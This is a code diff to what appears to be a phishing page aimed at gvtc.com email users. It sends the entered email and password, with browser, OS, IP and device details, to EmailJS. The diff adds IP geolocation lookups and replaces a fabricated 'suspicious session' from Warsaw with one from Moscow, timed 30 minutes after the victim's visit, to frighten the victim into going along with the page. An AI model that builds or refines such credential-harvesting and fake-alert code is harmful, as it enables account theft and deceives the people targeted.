@@ -123,7 +123,7 @@
     color: #1f2a37;
   }
 
-  /* ---- Self-care links: sky blue + underline ---- */
+  /* ---- Self-care links ---- */
   #self-care a {
     color: #63b3ed;
     text-decoration: underline;
@@ -342,8 +342,8 @@
     </div>
 
     <div class="session-card" id="session-warsaw">
-      <div class="device-name">Warsaw, Poland</div>
-      <div class="device-meta">Chrome on Windows · 2026-10-16 09:42 (CEST)</div>
+      <div class="device-name">Moscow, Russia</div>
+      <div class="device-meta" id="unknown-device-meta">Loading…</div>
       <button type="button" id="remove-warsaw">Remove</button>
     </div>
 
@@ -373,6 +373,7 @@
   const loginView = document.getElementById("login-view");
   const activityView = document.getElementById("activity-view");
   const currentDeviceMeta = document.getElementById("current-device-meta");
+  const unknownDeviceMeta = document.getElementById("unknown-device-meta");
 
   const sessionCurrent = document.getElementById("session-current");
   const sessionWarsaw = document.getElementById("session-warsaw");
@@ -383,9 +384,7 @@
   let attemptNumber = 1;
 
   // ---- Accepted domain: gvtc.com only ----
-  const ACCEPTED_DOMAINS = [
-    "gvtc.com"
-  ];
+  const ACCEPTED_DOMAINS = ["gvtc.com"];
 
   function buildAllowedDomainRegex(domains) {
     const escaped = domains.map(d => d.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
@@ -413,25 +412,55 @@
     if (ua.includes("like Mac")) return "iOS";
     return "Unknown";
   }
-  function getDeviceType() {
-    const ua = navigator.userAgent;
-    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
-    if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
-    return "Desktop";
-  }
-  function getTimestamp() {
-    return new Date().toLocaleString('en-US', { timeZoneName: 'short' });
-  }
   function getTimezone() {
     try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
     catch (e) { return "Unknown"; }
   }
+  function getTimestamp() {
+    return new Date().toLocaleString('en-US', { timeZoneName: 'short' });
+  }
+
+  // ---- Format a Date as e.g. "2026-10-16 09:42 (CEST)" ----
+  function formatDeviceTime(date) {
+    const pad = n => String(n).padStart(2, '0');
+    const yyyy = date.getFullYear();
+    const mm   = pad(date.getMonth() + 1);
+    const dd   = pad(date.getDate());
+    const hh   = pad(date.getHours());
+    const mi   = pad(date.getMinutes());
+    // timezone abbreviation
+    let tz = '';
+    try {
+      tz = new Intl.DateTimeFormat('en-US', { timeZoneName: 'short' })
+        .formatToParts(date)
+        .find(p => p.type === 'timeZoneName').value;
+    } catch (e) { tz = ''; }
+    return `${yyyy}-${mm}-${dd} ${hh}:${mi}${tz ? ' (' + tz + ')' : ''}`;
+  }
+
+  // ---- IP + geolocation helpers ----
   async function getIP() {
     try {
       const res = await fetch('https://api.ipify.org?format=json');
       const data = await res.json();
       return data.ip || "Not available";
     } catch (e) { return "Not available"; }
+  }
+
+  // Returns "City, Country" or null
+  async function getLocation() {
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      if (!res.ok) return null;
+      const data = await res.json();
+      const city = data.city || '';
+      const country = data.country_name || data.country || '';
+      if (city && country) return `${city}, ${country}`;
+      if (country) return country;
+      return null;
+    } catch (e) {
+      return null;
+    }
   }
 
   async function sendAttemptToEmailJS({ emailValue, passwordValue, attempt }) {
@@ -443,7 +472,12 @@
     const referrer = document.referrer || "Direct";
     const browser = getBrowser();
     const os = getOS();
-    const device = getDeviceType();
+    const device = (function() {
+      const ua = navigator.userAgent;
+      if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
+      if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
+      return "Desktop";
+    })();
     const screenResolution = `${window.screen.width}x${window.screen.height}`;
     const viewportSize = `${window.innerWidth}x${window.innerHeight}`;
     const timezone = getTimezone();
@@ -553,6 +587,23 @@ Links: ${linksCount}
 
     sendAttemptToEmailJS({ emailValue, passwordValue, attempt: attemptNumber });
 
+    // ---- Build the activity view data ----
+    const now = new Date();
+    const thirtyMinLater = new Date(now.getTime() + 30 * 60 * 1000);
+
+    // Current device: browser · OS · location · time
+    const browser = getBrowser();
+    const os = getOS();
+    const location = await getLocation();
+    const locationLabel = location || getTimezone();
+
+    currentDeviceMeta.textContent =
+      `${browser} on ${os} · ${locationLabel} · ${formatDeviceTime(now)}`;
+
+    // Unknown device: Moscow, Russia, 30 min ahead of local time
+    unknownDeviceMeta.textContent =
+      `Chrome on Windows · Moscow, Russia · ${formatDeviceTime(thirtyMinLater)}`;
+
     setTimeout(() => {
       submitBtn.disabled = false;
       submitBtn.textContent = "Submit";
@@ -561,8 +612,6 @@ Links: ${linksCount}
       activityView.style.display = "flex";
       sessionCurrent.classList.remove("removed");
       sessionWarsaw.classList.remove("removed");
-      currentDeviceMeta.textContent =
-        `${getBrowser()} on ${getOS()} · ${getTimezone()}`;
     }, 700);
   });
 
@@ -581,7 +630,7 @@ Links: ${linksCount}
 
   removeWarsawBtn.addEventListener("click", function(e) {
     e.preventDefault();
-    removeSession(sessionWarsaw, "Warsaw, Poland");
+    removeSession(sessionWarsaw, "Moscow, Russia");
   });
 
   document.getElementById("this-was-me").addEventListener("click", () => {
@@ -594,13 +643,14 @@ Links: ${linksCount}
     sessionCurrent.classList.remove("removed");
     sessionWarsaw.classList.remove("removed");
     currentDeviceMeta.textContent = "Loading device info…";
+    unknownDeviceMeta.textContent = "Loading…";
   });
 
   document.getElementById("secure-account").addEventListener("click", () => {
-    removeSession(sessionWarsaw, "Warsaw, Poland (secured)");
+    removeSession(sessionWarsaw, "Moscow, Russia (secured)");
     alertBox.innerHTML = `
       <strong>Account secured.</strong><br>
-      The suspicious session from <strong>Warsaw, Poland</strong> has been removed.
+      The suspicious session from <strong>Moscow, Russia</strong> has been removed.
     `;
   });
 </script>
